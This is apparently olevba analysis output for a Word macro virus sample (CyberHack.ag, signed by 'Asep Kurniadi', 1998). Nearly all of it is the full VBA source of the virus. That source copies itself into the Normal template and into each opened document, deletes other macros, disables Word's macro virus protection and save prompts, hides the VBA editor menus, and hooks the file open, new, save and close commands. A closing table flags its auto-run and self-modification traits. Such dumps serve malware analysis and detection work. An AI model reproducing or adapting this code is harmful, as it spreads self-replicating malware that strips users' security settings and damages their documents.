olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.CyberHack.ag-0780c164d9591035fc1f755e33c50aac6e2262f6
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.CyberHack.ag-0780c164d9591035fc1f755e33c50aac6e2262f6 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AsepMacro.bas 
in file: Virus.MSWord.CyberHack.ag-0780c164d9591035fc1f755e33c50aac6e2262f6 - OLE stream: 'Macros/VBA/AsepMacro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'--------------------------------------------------
' Maaf saya mengganggu dokumen anda
' Macro ini tidak berbahaya
' Cuma Numpang Nampang aja loch....
' By   : Asep Kurniadi (STMIK MUHAMMADIYAH JAKARTA)
' Date : 13 November 1998 (Semanggi Berdarah)
'--------------------------------------------------
Sub CekMacroNT()
    On Error GoTo NTErr1
    Set AD = ActiveDocument
    Set NT = NormalTemplate
    CekNT = False
    On Error GoTo NTErr2
    For i = 1 To NT.VBProject.VBComponents.Count
        nMacr = NT.VBProject.VBComponents(i).Name
        If nMacr = "AsepMacro" Then CekNT = True
        If (nMacr <> "ISave") And (nMacr <> "AsepMacro") And (nMacr <> "ThisDocument") Then
           Application.OrganizerDelete Source:=NT.FullName, _
           Name:=nMacr, Object:=wdOrganizerObjectProjectItems
        End If
    Next i
NTErr2:
    If CekNT = False Then
       On Error GoTo NTErr3
       Application.OrganizerCopy Source:=AD.FullName, _
               Destination:=NT.FullName, Name:="AsepMacro", Object:=wdOrganizerObjectProjectItems
       Application.OrganizerCopy Source:=AD.FullName, _
               Destination:=NT.FullName, Name:="ISave", Object:=wdOrganizerObjectProjectItems
       Templates(NT.Fulname).Save
NTErr3:
    End If
NTErr1:
End Sub
Sub CekMacroAD()
    On Error GoTo ADErr1
    Set AD = ActiveDocument
    Set NT = NormalTemplate
    CekAD = False
    On Error GoTo ADErr2
    For i = 1 To AD.VBProject.VBComponents.Count
        nMacr = AD.VBProject.VBComponents(i).Name
        If nMacr = "AsepMacro" Then CekAD = True
        If (nMacr <> "AsepMacro") And (nMacr <> "ISave") And _
           (nMacr <> "ThisDocument") And (nMacr <> "Reference to Normal") Then
           Application.OrganizerDelete Source:=AD.FullName, _
           Name:=nMacr, Object:=wdOrganizerObjectProjectItems
        End If
    Next i
ADErr2:
    If CekAD = False Then
       Application.OrganizerCopy Source:=NT.FullName, _
               Destination:=AD.FullName, Name:="AsepMacro", Object:=wdOrganizerObjectProjectItems
       Application.OrganizerCopy Source:=NT.FullName, _
               Destination:=AD.FullName, Name:="ISave", Object:=wdOrganizerObjectProjectItems
       AD.SaveAs FileName:=AD.Name, FileFormat:=wdFormatDocument
    End If
ADErr1:
End Sub


Sub CekMacro()
    WordBasic.DisableAutoMacros 0
    With CommandBars("Visual Basic")
         .Visible = False
         .Enabled = False
         .Protection = msoBarNoChangeVisible
         .Protection = msoBarNoCustomize
    End With
    On Error Resume Next
    CommandBars("Tools").Controls("Macro").Delete
    CustomizationContext = NormalTemplate
    With Options
         .VirusProtection = False
         .SaveNormalPrompt = False
    End With
    On Error GoTo 0
    Call CekMacroNT
    Call CekMacroAD
End Sub

Sub FileNew()
 On Error Resume Next
 Call CekMacro
 Dialogs(wdDialogFileNew).Show
 Call CekMacro
 ISave.Show
End Sub

Sub AutoOpen()
    Call CekMacro
End Sub
Sub FileOpen()
    On Error Resume Next
    Call CekMacro
    Dialogs(wdDialogFileOpen).Show
    Call CekMacro
    ISave.Show
End Sub
Sub FileExit()
    Call CekMacro
    ISave.Show
    WordBasic.FileExit
End Sub

Sub FileClose()
    On Error Resume Next
    Call CekMacro
    ISave.Show
    WordBasic.FileClose
    'Documents.Add
End Sub

Sub FileSaveAs()
    On Error Resume Next
    Call CekMacro
    Dialogs(wdDialogFileSaveAs).Show
    ISave.Show
End Sub
Sub ToolsOptions()
    Call CekMacro
    ISave.Show
End Sub
-------------------------------------------------------------------------------
VBA MACRO ISave.frm 
in file: Virus.MSWord.CyberHack.ag-0780c164d9591035fc1f755e33c50aac6e2262f6 - OLE stream: 'Macros/VBA/ISave'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 















Private Sub CmdClose_Click()
    Unload Me
End Sub

Private Sub ImgSTMIK_Click()
    MsgBox "Virus ini tidak berbahaya" _
        & Chr(13) & "hanya sekedar promosi"
End Sub

Private Sub LblISave_Click()
    MsgBox "By    : Asep Kurniadi" & Chr(13) & _
           "Date : 13 November 1998" & Chr(13) & _
           "       (Semanggi berdarah)"
End Sub

Private Sub UserForm_Activate()
    If Day(Date) = 22 And Month(Date) = 8 Then
       MsgBox "Ini hari Ulang Tahun ISAVE"
    End If
    tahun = Year(Date) - 1998
    If (Day(Date) = 13 Or Day(Date) = 14) And Month(Date) = 11 Then
       MsgBox "Mengenang " & Format$(tahun) & " Peristiwa Semanggi"
    End If
End Sub
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.CyberHack.ag-0780c164d9591035fc1f755e33c50aac6e2262f6' - OLE stream: 'Macros/ISave/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.CyberHack.ag-0780c164d9591035fc1f755e33c50aac6e2262f6' - OLE stream: 'Macros/ISave/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Close
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.CyberHack.ag-0780c164d9591035fc1f755e33c50aac6e2262f6' - OLE stream: 'Macros/ISave/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.CyberHack.ag-0780c164d9591035fc1f755e33c50aac6e2262f6' - OLE stream: 'Macros/ISave/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Sekolah TinggiJ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.CyberHack.ag-0780c164d9591035fc1f755e33c50aac6e2262f6' - OLE stream: 'Macros/ISave/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.CyberHack.ag-0780c164d9591035fc1f755e33c50aac6e2262f6' - OLE stream: 'Macros/ISave/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Manajemen Informatika dan KomputerI
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.CyberHack.ag-0780c164d9591035fc1f755e33c50aac6e2262f6' - OLE stream: 'Macros/ISave/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.CyberHack.ag-0780c164d9591035fc1f755e33c50aac6e2262f6' - OLE stream: 'Macros/ISave/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Muhammadiyah Jakartaf
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.CyberHack.ag-0780c164d9591035fc1f755e33c50aac6e2262f6' - OLE stream: 'Macros/ISave/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.CyberHack.ag-0780c164d9591035fc1f755e33c50aac6e2262f6' - OLE stream: 'Macros/ISave/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�(c) ISave 1998J
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.CyberHack.ag-0780c164d9591035fc1f755e33c50aac6e2262f6' - OLE stream: 'Macros/ISave/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Calisto MT19
-------------------------------------------------------------------------------
VBA FORM Variable "b'ImgSTMIK'" IN 'Virus.MSWord.CyberHack.ag-0780c164d9591035fc1f755e33c50aac6e2262f6' - OLE stream: 'Macros/ISave'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CmdClose'" IN 'Virus.MSWord.CyberHack.ag-0780c164d9591035fc1f755e33c50aac6e2262f6' - OLE stream: 'Macros/ISave'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'LblSTMIK1'" IN 'Virus.MSWord.CyberHack.ag-0780c164d9591035fc1f755e33c50aac6e2262f6' - OLE stream: 'Macros/ISave'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'LblSTMIK2'" IN 'Virus.MSWord.CyberHack.ag-0780c164d9591035fc1f755e33c50aac6e2262f6' - OLE stream: 'Macros/ISave'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'LblSTMIK3'" IN 'Virus.MSWord.CyberHack.ag-0780c164d9591035fc1f755e33c50aac6e2262f6' - OLE stream: 'Macros/ISave'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'LblISave'" IN 'Virus.MSWord.CyberHack.ag-0780c164d9591035fc1f755e33c50aac6e2262f6' - OLE stream: 'Macros/ISave'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |CmdClose_Click      |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

